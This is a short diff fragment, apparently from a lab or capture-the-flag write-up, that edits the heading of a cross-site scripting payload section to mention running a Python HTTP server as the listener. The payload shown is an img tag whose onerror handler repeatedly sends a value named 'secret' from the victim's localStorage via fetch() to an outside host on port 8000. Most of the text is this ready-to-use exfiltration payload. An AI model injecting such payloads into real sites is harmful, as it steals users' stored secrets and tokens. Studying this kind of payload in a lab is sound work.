@@ -30,7 +30,7 @@
           this.showMessage = true;
         })
 ```
-XSS Payload:
+XSS Payload: using ```python -m http.server 8000```
 ```
 <img src="x" onerror="setInterval(function() {fetch('http://192.168.160.106:8000?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
 ```
